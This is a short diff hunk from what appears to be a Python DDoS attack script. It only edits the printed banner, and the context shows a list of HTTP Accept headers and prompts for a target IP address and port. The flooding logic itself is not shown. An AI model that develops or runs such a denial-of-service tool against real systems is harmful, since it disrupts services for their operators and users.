@@ -1014,7 +1014,7 @@ acceptall=["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=
 "Accept-Language: en-US,en;q=0.5\r\n"]
 
 print("""
-	ROCOTAI DDOS ATTACK MADE BY HERTZ\n""")
+	DDOS ATTACK MADE BY HERTZ\n""")
 
 ip = str(input("Target ip: "))
 port = int(input("Port: "))
